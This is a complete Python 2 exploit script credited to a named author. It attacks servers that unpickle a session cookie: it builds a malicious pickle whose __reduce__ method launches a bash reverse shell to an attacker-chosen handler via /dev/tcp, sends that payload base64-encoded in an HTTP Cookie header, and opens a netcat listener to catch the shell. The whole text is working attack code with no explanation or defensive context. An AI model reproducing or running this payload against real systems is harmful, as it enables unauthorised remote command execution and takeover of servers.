
########################################################################
#Alvaro Folgado
########################################################################


#!/usr/bin/env python
import cPickle
import socket
import subprocess
import base64
import sys
import os

if len(sys.argv) != 5:
	print 'exploitlinux.py <TargetIp> <TargetPort> <HandlerIp> <HandlerPort>'
	sys.exit()

class payload(object):

	def  __reduce__(self):
		return (subprocess.Popen,(['/bin/bash','-c','bash -i > /dev/tcp/'+sys.argv[3]+'/'+sys.argv[4]+' 0>&1'],))

payload = base64.b64encode(cPickle.dumps(payload()))


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connect = s.connect((sys.argv[1],int(sys.argv[2])))

s.send('GET / HTTP/1.1\r\nCookie:session='+payload+';\r\nContent-Length: 2\r\n\r\n')

print "Shell or not to Shell"

os.system('nc -nlvp '+sys.argv[4]+'')

s.recv(1024)
